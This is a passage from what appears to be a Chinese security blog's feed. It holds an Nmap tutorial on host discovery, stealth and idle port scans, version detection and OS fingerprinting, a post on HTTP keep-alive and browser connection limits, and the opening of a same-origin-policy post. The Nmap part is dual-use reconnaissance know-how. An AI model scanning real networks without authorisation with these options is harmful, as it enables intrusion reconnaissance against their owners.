<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">主机探测：探测网络上的主机，例如列出响应TCP和ICMP请求、icmp请求、开放特别端口的主机。 </div><div class="line">端口扫描：探测目标主机所开放的端口。 </div><div class="line">版本检测：探测目标主机的网络服务，判断其服务名称及版本号。 </div><div class="line">系统检测：探测目标主机的操作系统及网络设备的硬件特性。 </div><div class="line">支持探测脚本的编写：使用Nmap的脚本引擎（NSE）和Lua编程语言。</div></pre></td></tr></table></figure>

<p>Nmap 能扫描出目标的详细信息包括、<a href="http://www.debouncer.com/reverse-dns-check" target="_blank" rel="external">DNS反解</a>、设备类型和mac地址。<br><br><br>Nmap用途</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1、通过对设备或者防火墙的探测来审计它的安全性。 </div><div class="line">2、探测目标主机所开放的端口。 </div><div class="line">3、网络存储，网络映射，维护和资产管理。（这个有待深入） </div><div class="line">4、通过识别新的服务器审计网络的安全性。 </div><div class="line">5、探测网络上的主机。</div></pre></td></tr></table></figure>

<p><br></p>
<hr>


<h2 id="0x01主机发现">0x01主机发现</h2>
<p>主机发现（Host Discovery），即用于发现目标主机是否在线（Alive，处于开启状态）。</p>
<h3 id="主机发现原理">主机发现原理</h3>
<ul>
<li>主机发现发现的原理与Ping命令类似，发送探测包到目标主机，如果收到回复，那么说明目标主机是开启的。Nmap支持十多种不同的主机探测方式，比如发送ICMP ECHO/TIMESTAMP/NETMASK报文、发送TCPSYN/ACK包、发送SCTP INIT/COOKIE-ECHO包，用户可以在不同的条件下灵活选用不同的方式来探测目标机。</li>
</ul>
<p>基本原理：（以ICMP echo为例）<br><img src="http://evilddog.qiniudn.com/ICMP-echo.jpg" alt=""></p>
<p>Nmap的用户位于源端，IP地址192.168.0.5，向目标主机192.168.0.3发送ICMP Echo Request。如果该请求报文没有被防火墙拦截掉，那么目标机会回复ICMP Echo Reply包回来。以此来确定目标主机是否在线。</p>
<p>默认情况下，Nmap会发送四种不同类型的数据包来探测目标主机是否在线。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ICMP echo request</div><div class="line"><span class="operator">a</span> TCP SYN packet <span class="built_in">to</span> port <span class="number">443</span></div><div class="line"><span class="operator">a</span> TCP ACK packet <span class="built_in">to</span> port <span class="number">80</span></div><div class="line"><span class="operator">an</span> ICMP timestamp request</div></pre></td></tr></table></figure>

<p>依次发送四个报文探测目标机是否开启。只要收到其中一个包的回复，那就证明目标机开启。使用四种不同类型的数据包可以避免因防火墙或丢包造成的判断错误。</p>
<hr>


<h3 id="主机发现用法">主机发现用法</h3>
<p>通常主机发现并不单独使用，而只是作为端口扫描、版本侦测、OS侦测先行步骤。而在某些特殊应用（例如确定大型局域网内活动主机的数量），可能会单独专门适用主机发现功能来完成。不管是作为辅助用法还是专门用途，用户都可以使用Nmap提供的丰富的选项来定制主机发现的探测方式。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby"><span class="symbol">sL:</span> <span class="constant">List</span> <span class="constant">Scan</span> 列表扫描，仅将指定的目标的<span class="constant">IP</span>列举出来，不进行主机发现。</span></div><div class="line">-<span class="ruby"><span class="symbol">sn:</span> <span class="constant">Ping</span> <span class="constant">Scan</span> 只进行主机发现，不进行端口扫描。</span></div><div class="line">-<span class="ruby"><span class="constant">Pn</span><span class="symbol">:</span> 将所有指定的主机视作开启的，跳过主机发现的过程。</span></div><div class="line">-<span class="ruby"><span class="constant">PS</span>/<span class="constant">PA</span>/<span class="constant">PU</span>/<span class="constant">PY</span>[portlist]<span class="symbol">:</span> 使用<span class="constant">TCPSYN</span>/<span class="constant">ACK</span>或<span class="constant">SCTP</span> <span class="constant">INIT</span>/<span class="constant">ECHO</span>方式进行发现。</span></div><div class="line">-<span class="ruby"><span class="constant">PE</span>/<span class="constant">PP</span>/<span class="constant">PM</span><span class="symbol">:</span> 使用<span class="constant">ICMP</span> echo, timestamp, <span class="keyword">and</span> netmask 请求包发现主机。-<span class="constant">PO</span>[protocollist]<span class="symbol">:</span> 使用<span class="constant">IP</span>协议包探测</span></div><div class="line">对方主机是否开启。</div><div class="line">-<span class="ruby">n/-<span class="constant">R</span><span class="symbol">:</span> -n表示不进行<span class="constant">DNS</span>解析；-<span class="constant">R</span>表示总是进行<span class="constant">DNS</span>解析。</span></div><div class="line">-<span class="ruby">-dns-servers &lt;serv1[,serv2],...&gt;<span class="symbol">:</span> 指定<span class="constant">DNS</span>服务器。</span></div><div class="line">-<span class="ruby">-system-<span class="symbol">dns:</span> 指定使用系统的<span class="constant">DNS</span>服务器</span></div><div class="line">-<span class="ruby">-<span class="symbol">traceroute:</span> 追踪每个路由节点</span></div></pre></td></tr></table></figure>

<p><br></p>
<hr>

<h2 id="0x02端口扫描">0x02端口扫描</h2>
<p>端口扫描是Nmap最基本最核心的功能，用于确定目标主机的TCP/UDP端口的开放情况。</p>
<p>默认情况下，Nmap会扫描1000个最有可能开放的TCP端口。</p>
<p>Nmap通过探测将端口划分为6个状态：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">b</span>&gt;</span>open<span class="tag">&lt;<span class="title">b</span>/&gt;</span>：端口是开放的。</div><div class="line"><span class="tag">&lt;<span class="title">b</span>&gt;</span>closed<span class="tag">&lt;/<span class="title">b</span>&gt;</span>：端口是关闭的。</div><div class="line"><span class="tag">&lt;<span class="title">b</span>&gt;</span>filtered<span class="tag">&lt;<span class="title">b</span>/&gt;</span>：端口被防火墙IDS/IPS屏蔽，无法确定其状态。</div><div class="line"><span class="tag">&lt;<span class="title">b</span>&gt;</span>unfiltered<span class="tag">&lt;<span class="title">b</span>/&gt;</span>：端口没有被屏蔽，但是否开放需要进一步确定。</div><div class="line"><span class="tag">&lt;<span class="title">b</span>&gt;</span>open|filtered<span class="tag">&lt;<span class="title">b</span>/&gt;</span>：端口是开放的或被屏蔽。</div><div class="line"><span class="tag">&lt;<span class="title">b</span>&gt;</span>losed|filtered <span class="tag">&lt;<span class="title">b</span>/&gt;</span>：端口是关闭的或被屏蔽。</div></pre></td></tr></table></figure>

<p><br></p>
<h3 id="端口扫描原理:">端口扫描原理:</h3>
<p>Nmap在端口扫描方面非常强大，提供了十多种探测方式。</p>
<hr>

<h4 id="TCP_SYN_scanning">TCP SYN scanning</h4>
<p>这是Nmap默认的扫描方式，通常被称作半开放扫描（Half-open scanning）。该方式发送SYN到目标端口，如果收到SYN/ACK回复，那么判断端口是开放的；如果收到RST包，说明该端口是关闭的。如果没有收到回复，那么判断该端口被屏蔽（Filtered）。因为该方式仅发送SYN包对目标主机的特定端口，但不建立的完整的TCP连接，所以相对比较隐蔽，而且效率比较高，适用范围广。</p>
<p>TCP SYN探测到端口关闭：<img src="http://evilddog.qiniudn.com/tcp-syn.jpg" alt=""><br>TCP SYN探测到端口开放：<img src="http://evilddog.qiniudn.com/tcp-syn-close.jpg" alt=""></p>
<hr>

<h4 id="TCP_connect_scanning">TCP connect scanning</h4>
<p>TCP connect方式使用系统网络API connect向目标主机的端口发起连接，如果无法连接，说明该端口关闭。该方式扫描速度比较慢，而且由于建立完整的TCP连接会在目标机上留下记录信息，不够隐蔽。所以，TCP connect是TCP SYN无法使用才考虑选择的方式。</p>
<p>TCP connect探测到端口关闭：<img src="http://evilddog.qiniudn.com/tcp-close.jpg" alt=""><br>TCP connect探测到端口开放：<img src="http://evilddog.qiniudn.com/tcp-open.jpg" alt=""></p>
<hr>

<h4 id="TCP_ACK_scanning">TCP ACK scanning</h4>
<p>向目标主机的端口发送ACK包，如果收到RST包，说明该端口没有被防火墙屏蔽；没有收到RST包，说明被屏蔽。该方式只能用于确定防火墙是否屏蔽某个端口，可以辅助TCP SYN的方式来判断目标主机防火墙的状况。</p>
<p>TCP ACK探测到端口被屏蔽：<img src="http://evilddog.qiniudn.com/tcp-ack-close.jpg" alt=""><br>TCP ACK探测到端口被未被屏蔽：<img src="http://evilddog.qiniudn.com/tcp-ack-open.jpg" alt=""></p>
<hr>

<h4 id="TCP_FIN/Xmas/NULL_scanning">TCP FIN/Xmas/NULL scanning</h4>
<p>这三种扫描方式被称为秘密扫描（Stealthy Scan），因为相对比较隐蔽。FIN扫描向目标主机的端口发送的TCP FIN包或Xmas tree包/Null包，如果收到对方RST回复包，那么说明该端口是关闭的；没有收到RST包说明端口可能是开放的或被屏蔽的（open|filtered）。</p>
<p>其中Xmas tree包是指flags中FIN URG PUSH被置为1的TCP包；NULL包是指所有flags都为0的TCP包。<br>TCP FIN探测到主机端口是关闭的：<img src="http://evilddog.qiniudn.com/tcp-fin-close.jpg" alt=""></p>
<p>TCP FIN探测到主机端口是开放或屏蔽的：<img src="http://evilddog.qiniudn.com/tcp-fin-open.jpg" alt=""></p>
<hr>

<h4 id="UDP_scanning">UDP scanning</h4>
<p>UDP扫描方式用于判断UDP端口的情况。向目标主机的UDP端口发送探测包，如果收到回复“ICMP port unreachable”就说明该端口是关闭的；如果没有收到回复，那说明UDP端口可能是开放的或屏蔽的。因此，通过反向排除法的方式来断定哪些UDP端口是可能出于开放状态。</p>
<p>UDP端口关闭：<img src="http://evilddog.qiniudn.com/tcp-udp-close.jpg" alt=""></p>
<p>UDP端口开放或被屏蔽：<img src="http://evilddog.qiniudn.com/tcp-udp-open.jpg" alt="">    </p>
<h3 id="端口扫描用法">端口扫描用法</h3>
<p><br></p>
<h4 id="扫描方式">扫描方式</h4>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">sS/sT/sA/sW/<span class="symbol">sM:</span>指定使用 <span class="constant">TCP</span> <span class="constant">SYN</span>/<span class="constant">Connect</span>()/<span class="constant">ACK</span>/<span class="constant">Window</span>/<span class="constant">Maimon</span> scans的方式来对目标主机进行扫描。</span></div><div class="line">-<span class="ruby"><span class="symbol">sU:</span> 指定使用<span class="constant">UDP</span>扫描方式确定目标主机的<span class="constant">UDP</span>端口状况。</span></div><div class="line">-<span class="ruby">sN/sF/<span class="symbol">sX:</span> 指定使用<span class="constant">TCP</span> <span class="constant">Null</span>, <span class="constant">FIN</span>, <span class="keyword">and</span> <span class="constant">Xmas</span> scans秘密扫描方式来协助探测对方的<span class="constant">TCP</span>端口状态。</span></div><div class="line">-<span class="ruby">-scanflags &lt;flags&gt;<span class="symbol">:</span> 定制<span class="constant">TCP</span>包的flags。</span></div><div class="line">-<span class="ruby">sI &lt;zombiehost[<span class="symbol">:probeport</span>]&gt;<span class="symbol">:</span> 指定使用idle scan方式来扫描目标主机（前提需要找到合适的zombie host）</span></div><div class="line">-<span class="ruby">sY/<span class="symbol">sZ:</span> 使用<span class="constant">SCTP</span> <span class="constant">INIT</span>/<span class="constant">COOKIE</span>-<span class="constant">ECHO</span>来扫描<span class="constant">SCTP</span>协议端口的开放的情况。</span></div><div class="line">-<span class="ruby"><span class="symbol">sO:</span> 使用<span class="constant">IP</span> protocol 扫描确定目标机支持的协议类型。</span></div><div class="line">-<span class="ruby">b &lt;<span class="constant">FTP</span> relay host&gt;<span class="symbol">:</span> 使用<span class="constant">FTP</span> bounce scan扫描方式</span></div></pre></td></tr></table></figure>

<p><br></p>
<h4 id="端口参数和顺序">端口参数和顺序</h4>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">p &lt;port ranges&gt;<span class="symbol">:</span> 扫描指定的端口</span></div><div class="line">实例: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9（其中T代表TCP协议、U代表UDP协议、S代</div><div class="line">表SCTP协议）</div><div class="line">-<span class="ruby"><span class="constant">F</span><span class="symbol">:</span> <span class="constant">Fast</span> mode – 快速模式，仅扫描<span class="constant">TOP</span> <span class="number">100</span>的端口</span></div><div class="line">-<span class="ruby"><span class="symbol">r:</span> 不进行端口随机打乱的操作（如无该参数，nmap会将要扫描的端口以随机顺序方式扫描，以让nmap的扫描不易被对方防</span></div><div class="line">火墙检测到）。</div><div class="line">-<span class="ruby">-top-ports &lt;number&gt;<span class="symbol">:</span>扫描开放概率最高的number个端口（nmap的作者曾经做过大规模地互联网扫描，以此统计出网络</span></div><div class="line">上各种端口可能开放的概率。以此排列出最有可能开放端口的列表，具体可以参见文件：nmap-services。默认情况下，nmap</div><div class="line">会扫描最有可能的1000个TCP端口）</div><div class="line">-<span class="ruby">-port-ratio &lt;ratio&gt;<span class="symbol">:</span> 扫描指定频率以上的端口。与上述--top-ports类似，这里以概率作为参数，让概率大于--por</span></div><div class="line">t-ratio的端口才被扫描。显然参数必须在在0到1之间，具体范围概率情况可以查看nmap-services文件。</div></pre></td></tr></table></figure>

<p><br></p>
<hr>


<h2 id="0x03版本侦测">0x03版本侦测</h2>
<p>版本侦测，用于确定目标主机开放端口上运行的具体的应用程序及版本信息。</p>
<p>Nmap提供的版本侦测具有如下的优点：</p>
<ul>
<li>高速。并行地进行套接字操作，实现一组高效的探测匹配定义语法。</li>
<li>尽可能地确定应用名字与版本名字。</li>
<li>支持TCP/UDP协议，支持文本格式与二进制格式。</li>
<li>支持多种平台服务的侦测，包括Linux/Windows/Mac OS/FreeBSD等系统。</li>
<li>如果检测到SSL，会调用openSSL继续侦测运行在SSL上的具体协议（如HTTPS/POP3S/IMAPS）。</li>
<li>如果检测到SunRPC服务，那么会调用brute-force RPC grinder进一步确定RPC程序编号、名字、版本号。</li>
<li>支持完整的IPv6功能，包括TCP/UDP，基于TCP的SSL。</li>
<li>通用平台枚举功能（CPE）</li>
<li>广泛的应用程序数据库（nmap-services-probes）。目前Nmap可以识别几千种服务的签名，包含了180多种不同的协议。</li>
</ul>
<p><br></p>
<h3 id="版本侦测原理">版本侦测原理</h3>
<p>版本侦测主要分为以下几个步骤：</p>
<ol>
<li>首先检查open与open|filtered状态的端口是否在排除端口列表内。如果在排除列表，将该端口剔除。</li>
<li>如果是TCP端口，尝试建立TCP连接。尝试等待片刻（通常6秒或更多，具体时间可以查询文件nmap-services-probes中Probe TCP NULL q||对应的totalwaitms）。通常在等待时间内，会接收到目标机发送的“WelcomeBanner”信息。nmap将接收到的Banner与nmap-services-probes中NULL probe中的签名进行对比。查找对应应用程序的名字与版本信息。</li>
<li>如果通过“Welcome Banner”无法确定应用程序版本，那么nmap再尝试发送其他的探测包（即从nmap-services-probes中挑选合适的probe），将probe得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印出应用返回报文，让用户自行进一步判定。</li>
<li>如果是UDP端口，那么直接使用nmap-services-probes中探测包进行探测匹配。根据结果对比分析出UDP应用服务类型。</li>
<li>如果探测到应用程序是SSL，那么调用openSSL进一步的侦查运行在SSL之上的具体的应用类型。</li>
<li>如果探测到应用程序是SunRPC，那么调用brute-force RPC grinder进一步探测具体服务。</li>
</ol>
<p><br></p>
<h3 id="版本侦测的用法">版本侦测的用法</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby"><span class="symbol">sV:</span> 指定让<span class="constant">Nmap</span>进行版本侦测</span></div><div class="line">-<span class="ruby">-version-intensity &lt;level&gt;<span class="symbol">:</span> 指定版本侦测强度（<span class="number">0</span>-<span class="number">9</span>），默认为<span class="number">7</span>。数值越高，探测出的服务越准确，但是运行时间会比较长。</span></div><div class="line">-<span class="ruby">-version-<span class="symbol">light:</span> 指定使用轻量侦测方式 (intensity <span class="number">2</span>)</span></div><div class="line">-<span class="ruby">-version-<span class="symbol">all:</span> 尝试使用所有的probes进行侦测 (intensity <span class="number">9</span>)</span></div><div class="line">-<span class="ruby">-version-<span class="symbol">trace:</span> 显示出详细的版本侦测过程信息。</span></div></pre></td></tr></table></figure>

<p><br></p>
<hr>

<h2 id="0x04操作系统侦测">0x04操作系统侦测</h2>
<h3 id="OS侦测原理">OS侦测原理</h3>
<p>Nmap使用TCP/IP协议栈指纹来识别不同的操作系统和设备。在RFC规范中，有些地方对TCP/IP的实现并没有强制规定，由此不同的TCP/IP方案中可能都有自己的特定方式。Nmap主要是根据这些细节上的差异来判断操作系统的类型的。</p>
<p>具体实现方式如下：</p>
<ol>
<li>Nmap内部包含了2600多已知系统的指纹特征（在文件nmap-os-db文件中）。将此指纹数据库作为进行指纹对比的样本库。</li>
<li>分别挑选一个open和closed的端口，向其发送经过精心设计的TCP/UDP/ICMP数据包，根据返回的数据包生成一份系统指纹。</li>
<li>将探测生成的指纹与nmap-os-db中指纹进行对比，查找匹配的系统。如果无法匹配，以概率形式列举出可能的系统。</li>
</ol>
<h3 id="OS侦测用法">OS侦测用法</h3>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby"><span class="constant">O</span><span class="symbol">:</span> 指定<span class="constant">Nmap</span>进行<span class="constant">OS</span>侦测。  </span></div><div class="line">-<span class="ruby">-osscan-<span class="symbol">limit:</span> 限制<span class="constant">Nmap</span>只对确定的主机的进行<span class="constant">OS</span>探测（至少需确知该主机分别有一个open和closed的端口）。  </span></div><div class="line">-<span class="ruby">-osscan-<span class="symbol">guess:</span> 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统。</span></div></pre></td></tr></table></figure>

<p><br></p>
<hr>

<h2 id="0x05">0x05</h2>
]]></content>
    <summary type="html">
    <![CDATA[<hr>

<h2 id="0x00_Nmap介绍">0x00 Nmap介绍</h2>
<p>Nmap  （网络映射器）是由 Gordon Lyon设计，用来探测计算机网络上的主机和服务的一种安全扫描器。为了绘制网络拓扑图，Nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。</p>
]]>
    
    </summary>
    
      <category term="Nmap" scheme="http://evilddog.github.io//tags/Nmap/"/>
    
      <category term="Tools" scheme="http://evilddog.github.io//categories/Tools/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[浅谈浏览器最大并发连接数问题]]></title>
    <link href="http://evilddog.github.io/2014/10/24/http-max-connection/"/>
    <id>http://evilddog.github.io/2014/10/24/http-max-connection/</id>
    <published>2014-10-24T03:13:06.000Z</published>
    <updated>2014-11-05T16:23:34.000Z</updated>
    <content type="html"><![CDATA[<hr>

<p>偶然刷知乎刷到一个无人关注，无人回答的<a href="http://www.zhihu.com/question/22935511" target="_blank" rel="external">问题</a>,然后觉得自己答不上来(逃</p>
<p>于是转向度娘和谷歌,觉得看起来简单的问题牵扯到到东西挺多的,便一边查一边记下来</p>
<p><a id="more"></a></p>
<p><hr></p>
<h2 id="首先说一说HTTP的短链接和长连接">首先说一说HTTP的短链接和长连接</h2>
<p>一个典型的网页，是由一个HTML文件和内嵌的各类元素组成的，这些元素包括页面内的图片，CSS文件，Javascript 文件等等。每一个内嵌的元素在 HTTP 协议的层面上任何一个文件是没有区别的,都需要浏览器去服务器上传输过来。</p>
<p>一个早期典型的浏览器是这样实现的：当用户敲入网址之后，浏览器和服务器建立连接<del>中间的DSN请求和本地缓存以及SSL不是本文的重点</del>，请求这个HTML页面，然后边接收服务器发送的HTML页面，边解析，碰到内嵌元素，可以立即开第二条连接请求。</p>
<p>另外，如果内嵌元素很多，他可能会开多条连接同时请求。当所有需要的元素都下载完毕之后，浏览器就会将页面画出来。这个过程就是最早期的 HTTP/1.0 协议所设想的浏览器实现。</p>
<p>HTTP/1.0 这种多连接的运作模式是可以改进的。在TCP传输中客户端和服务器要发送三次握手包才能建立TCP连接。连接建立之后，浏览器给服务器发请求，服务器给浏览器回应。之后又会要传输几个网络包关闭TCP连接。</p>
<p>如果页面有很多文件长度很短的元素，每个元素都需要单建一条连接就会导致网络上大量的都是 TCP 建立连接和断开连接的网络包。另外，TCP有一个特性叫做 <a href="http://blog.csdn.net/great3779/article/details/6578033" target="_blank" rel="external">slow start</a>，其含义可以大致这样解释：<strong>TCP连接要求发送端发送一定数量的网络包之后接收端就要回一个”Get it”的网络包，而且网络包在经过每个路由器的时候包头都要被重写，所以在网络不丢包的情况下网络包越大网络的效率就越高。</strong></p>
<p>TCP 连接寻找最优网络包大小的方法是，在 TCP连接建立的初期，网络包的大小是很小的，根据网络状况，两端的程序才会逐步增大网络包的大小以适应带宽提高网络传输的效率。所以浏览器给服务器发请求，如果每发一个请求就关闭连接的话，那这个连接的数据传输很难达到带宽所能承载的速度。慢启动其实也是为什么在下载文件过程中传输速度是先缓慢上升的原因。<br><br><br><b>所以！！！！！！！！！！</b><br><br></p>
<h4 id="_HTTP/1-1_开始提出了持久连接(Persistent_Connection)的概念，也就是说同一条_HTTP连接，可以依次处理多个请求，同时用一定的机制保证各个请求之间的分离性。具体的操作过程是：服务器给浏览器发送回应之后，并不马上关闭连接;浏览器判断上一个请求的回应已经收完的情况下，可以在这同一个连接上发第二个请求。"><strong> HTTP/1.1 开始提出了持久连接(Persistent Connection)的概念，也就是说同一条 HTTP连接，可以依次处理多个请求，同时用一定的机制保证各个请求之间的分离性。具体的操作过程是：服务器给浏览器发送回应之后，并不马上关闭连接;浏览器判断上一个请求的回应已经收完的情况下，可以在这同一个连接上发第二个请求。</strong></h4>
<h4 id="_这种运作模式大大减少了网络包，实验也表明这种做法很有效。但是，由于服务器上保持连接要占用一定的资源，所以一般服务器不会永久保持持久连接，而且也不推荐浏览器和服务器之间建立过多的持久连接。"><strong> 这种运作模式大大减少了网络包，实验也表明这种做法很有效。但是，由于服务器上保持连接要占用一定的资源，所以一般服务器不会永久保持持久连接，而且也不推荐浏览器和服务器之间建立过多的持久连接。</strong></h4>
<p><br><br><em><del>WTF,这东西又臭又长说起来太费劲,但又必须说清楚</del></em> <img src="http://evilddog.qiniudn.com/xianzhuo.jpg" alt=""></p>
<h3 id="接下来是正片_=_=">接下来是正片   = =</h3>
<p><br><br><strong>HTTP协议与TCP/IP协议</strong></p>
<p>HTTP的长连接和短连接本质上是TCP长连接和短连接。HTTP属于应用层协议，在传输层使用TCP协议，在网络层使用IP协议。</p>
<p><br></p>
<p><strong>HTTP协议是无状态的</strong></p>
<p>HTTP协议的无状态指的是协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。HTTP是一个无状态的面向连接的协议，无状态不代表HTTP不能保持TCP连接，更不能代表HTTP使用的是UDP协议。</p>
<p><br></p>
<p><strong>什么是短连接</strong></p>
<p>client向server发起连接请求，server接到请求，然后双方建立连接。client向server 发送消息，server回应client，然后一次读写就完成了。从上面的描述看，短连接一般只会在 client/server间传递一次读写操作。</p>
<p><br></p>
<p><strong>TCP长连接：</strong></p>
<p>链接建立之后，如果应用程序或者上层协议一直不发送数据，或者隔很长时间才发送一次数据，当链接很久没有数据报文传输时如何去确定对方还在线，到底是掉线了还是确实没有数据传输.</p>
<p>TCP协议通过一种巧妙的方式去解决这个问题，当超过一段时间之后，TCP自动发送一个数据为空的报文给对方，如果对方回应了这个报文，说明对方还在线，链接可以继续保持，如果对方没有报文返回，并且重试了多次之后则认为链接丢失，没有必要保持链接。</p>
<p><br></p>
<p><strong>HTTP长链接：</strong></p>
<p>其实HTTP的长连接和TCP的长连接完全不一样。HTTP层的Keep-Alive是什么概念呢？<br>TCP在建立链接之后， HTTP协议使用TCP传输HTTP协议的请求(Request)和响应(Response)数据，一次完整的HTTP事务如下图(实际上的请求和响应需要多个TCP报文)：<img src="http://images.cnitblog.com/i/592959/201407/170853222245220.jpg" alt=""></p>
<p>从图中可以发现一个完整的HTTP事务，有链接的建立，请求的发送，响应接收，断开链接这四个过程,早期通过HTTP协议传输的数据以文本为主，一个请求可能就把所有要返回的数据取到，但是，现在要展现一张完整的页面需要很多个请求才能完成，如图片,JS,CSS等，如果每一个HTTP请求都需要新建并断开一个TCP，这个开销是完全没有必要的。</p>
<p>开启HTTP Keep-Alive之后，能复用已有的TCP链接，当前一个请求已经响应完毕，服务器端没有立即关闭TCP链接，而是等待一段时间接收浏览器端可能发送过来的第二个请求，通常浏览器在第一个请求返回之后会立即发送第二个请求，如果某一时刻只能有一个链接，同一个TCP链接处理的请求越多，开启KeepAlive能节省的TCP建立和关闭的消耗就越多。</p>
<p>当然通常会启用多个链接去从服务器器上请求资源，但是开启了Keep-Alive之后，仍然能加快资源的加载速度。HTTP/1.1之后默认开启Keep-Alive, 在HTTP的头域中增加Connection选项。当设置为Connection:keep-alive表示开启，设置为Connection:close表示关闭。实际上HTTP的KeepAlive写法是Keep-Alive，跟TCP的KeepAlive写法上也有不同。所以TCP的KeepAlive和HTTP的Keep-Alive不是同一回事情。</p>
<p><br></p>
<p><hr></p>
<h2 id="然后是浏览器的并发连接数问题">然后是浏览器的并发连接数问题</h2>
<p>每款浏览器都有自己的默认并发连接数，而且浏览器默认对同一域下的资源，只保持一定的连接数，会阻塞过多的连接，这都会影响到浏览器对网页的加载速度。</p>
<p>这个限制，对于普通的Web应用来讲，影响不算太大，毕竟正常的连接请求都会很快有返回结果的，但如果在Web中要是用长连接的话，就可能会有比较大的问题了，长连接会一直占用一个连接数。</p>
<p><hr></p>
<h4 id="那么，最大化提高浏览器的并发连接数不好么？"><strong>那么，最大化提高浏览器的并发连接数不好么？</strong></h4>
<p>当然不是,首先我们了解一下浏览器怎么并发连接数的：</p>
<pre><code><span class="bullet">1. </span>浏览器发出请求。
<span class="bullet">2. </span>DNS进行解析。
<span class="bullet">3. </span>服务器返回请求内容。
<span class="bullet">4. </span>浏览器按顺序分析获取的内容，并且依次获取页面的外链css、外链js、img等，一个下载完再下载下一个。
</code></pre><p>所以并发连接数的增加对一个域名同时并发请求数达到了多个，这样浏览器就可以同时下载js，css，img了，一般情况下，堵塞的现象就很少了。<br><br><br>如下是各种主流浏览器的默认最大并发连接数:<img src="http://evilddog.qiniudn.com/http-keep-alive.png" alt=""><br>W3C 的 <a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec8.html#sec8.1.4" target="_blank" rel="external">HTTP/1.1协议</a> 中提到，如果是相同域名下的请求，就会有限制，只能保持一定数量。同样，<a href="https://developer.yahoo.com/performance/rules.html" target="_blank" rel="external">Yahoo!关于网站优化的经典建议</a>中提到“要减少请求数”和“减少 DNS 解析次数”，而这就和我们网站的做法相违背了。这就需要在提高并发连接数和减少DNS解析之间找到个完美的平衡点了</p>
<p>不过很多时候我们为了效率还想得到更高的并发连接数，比如说我们总会看到一些大网站采用独立域名或者二级域名来设置专门的图片服务器，其实有一部分原因就 是为了增加并发连接数。至于使用独立域名还是二级域名的差别在于Cookie的影响，当使用和主站根域名相同的二级域名时，请求的同时也会捎带着传递主站根域名的Cookie，而使用和主站根域名不同的独立域名时，则不会受主站根域名Cookie的影响，所以带宽占用会更小一些。</p>
<p><hr></p>
<h2 id="DNS服务器这些东西关我屁事，我只想下载速度快点">DNS服务器这些东西关我屁事，我只想下载速度快点</h2>
<p>虽然各主流浏览器的最大并发连接数默认都小于10，不过都是可以更改的</p>
<p>但是在下载文件的时候,如果有很多keep-alive的连接存在，肯定会慢的1B，当然这些参数都是可以修改的，比如IE浏览器的<a href="http://support2.microsoft.com/?kbid=282402" target="_blank" rel="external">官方文档</a>，火狐浏览器的<a href="about:config" target="_blank" rel="external">配置如下</a></p>
<p><img src="http://evilddog.qiniudn.com/firefox.png" alt=""></p>
<p>但是实际上天朝人民的HTTP传输的连接并发数 <strong>60%都是大于8的</strong></p>
<p>原因就是国内迅雷，暴风影音，快车，QQ旋风等多线程下载器的流行，这也是为什么在进行大流量文件传输过程时下载器的速度要远比浏览器要快的主要原因，当然还有带宽等其他因素影响</p>
]]></content>
    <summary type="html">
    <![CDATA[<hr>

<p>偶然刷知乎刷到一个无人关注，无人回答的<a href="http://www.zhihu.com/question/22935511" target="_blank" rel="external">问题</a>,然后觉得自己答不上来(逃</p>
<p>于是转向度娘和谷歌,觉得看起来简单的问题牵扯到到东西挺多的,便一边查一边记下来</p>
<p>]]>
    
    </summary>
    
      <category term="HTTP" scheme="http://evilddog.github.io//tags/HTTP/"/>
    
      <category term="HTTP" scheme="http://evilddog.github.io//categories/HTTP/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[浅谈浏览器的同源策略]]></title>
    <link href="http://evilddog.github.io/2014/10/13/same-origin-policy/"/>
    <id>http://evilddog.github.io/2014/10/13/same-origin-policy/</id>
    <published>2014-10-13T05:58:01.000Z</published>
    <updated>2014-11-09T06:09:09.000Z</updated>
    <content type="html"><![CDATA[<hr>

<h1 id="0x01_概念">0x01  概念</h1>
<p>同源策略(Same Origin Policy，SOP)，由Netscape提出的一个著名的安全策略,也称为单源策略(Single Origin policy).</p>
<a id="more"></a>

<p>它是一种用于Web浏览器编程语言（如JavaScript和Ajax）的安全措施，以保护信息的保密性和完整性。</p>
